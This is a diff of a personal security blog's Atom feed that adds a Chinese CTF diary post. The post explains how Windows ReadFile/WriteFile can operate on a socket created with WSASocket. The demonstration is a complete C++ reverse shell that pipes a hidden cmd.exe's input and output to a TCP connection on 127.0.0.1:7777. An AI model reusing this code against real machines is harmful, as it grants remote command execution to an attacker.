@@ -6,7 +6,7 @@
   <link href="https://h4ckf0rfun.github.io/atom.xml" rel="self"/>
   
   <link href="https://h4ckf0rfun.github.io/"/>
-  <updated>2022-09-15T13:39:19.388Z</updated>
+  <updated>2022-09-16T12:49:04.762Z</updated>
   <id>https://h4ckf0rfun.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>windows下调用Write/ReadFile来操作socket</title>
+    <link href="https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%93%8D%E4%BD%9Csocket/"/>
+    <id>https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%93%8D%E4%BD%9Csocket/</id>
+    <published>2022-09-16T12:08:46.000Z</published>
+    <updated>2022-09-16T12:49:04.762Z</updated>
+    
+    <content type="html"><![CDATA[<p>今天比赛的时候发现了个有趣的东西:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%93%8D%E4%BD%9Csocket/Untitled.png" alt="Untitled"></p><p>是一道misc的题目，里面直接把cmd 的输入输出重定向到了socket，如果在linux下面，这是毫无疑问可以的。但是windows下的话，在控制台输入输出实际是调用的Read&#x2F;WriteFile 函数，如果这个程序没有问题的话，说明Read&#x2F;WriteFile是可以对socket进行操作的。</p><p>但是我以前测试的时候，是不能的。唯一的区别就是这里用的是WSASocket，而我的是socket函数，换成WSASocket测试，果然成功了:</p><p><img src="https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%93%8D%E4%BD%9Csocket/Untitled%201.png" alt="Untitled"></p><p>代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> sz_addr[] = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="type">int</span> port = <span class="number">7777</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">entry</span><span class="params">()</span></span>&#123;</span><br><span class="line">WSADATA wsadata;</span><br><span class="line"><span class="type">int</span> ExitCode = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">0</span>), &amp;wsadata))&#123;</span><br><span class="line"><span class="keyword">goto</span> _error;</span><br><span class="line">&#125;</span><br><span class="line">SOCKET s = <span class="built_in">WSASocket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (s == INVALID_SOCKET)&#123;</span><br><span class="line"><span class="keyword">goto</span> _error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">SOCKADDR_IN addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">addr.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(sz_addr);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = <span class="built_in">htons</span>(port);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">connect</span>(s, (SOCKADDR*)&amp;addr, <span class="built_in">sizeof</span>(addr)))&#123;</span><br><span class="line"><span class="keyword">goto</span> _error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">STARTUPINFOA si = &#123; <span class="built_in">sizeof</span>(si) &#125;;</span><br><span class="line">PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">si.hStdError = (HANDLE)s;</span><br><span class="line">si.hStdOutput = (HANDLE)s;</span><br><span class="line">si.hStdInput = (HANDLE)s;</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line"></span><br><span class="line">si.wShowWindow = SW_HIDE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CreateProcessA</span>(<span class="number">0</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, TRUE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))&#123;</span><br><span class="line"><span class="keyword">goto</span> _error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(pi.hProcess, INFINITE);</span><br><span class="line">ExitCode = <span class="number">0</span>;</span><br><span class="line">_error:</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%93%8D%E4%BD%9Csocket/Untitled%202.png" alt="Untitled"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;今天比赛的时候发现了个有趣的东西:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/2022/09/16/windows%E4%B8%8B%E8%B0%83%E7%94%A8Write-ReadFile%E6%9D%A5%E6%9</summary>
+      
+    
+    
+    
+    <category term="日记" scheme="https://h4ckf0rfun.github.io/categories/%E6%97%A5%E8%AE%B0/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>linux运行其他架构的程序</title>
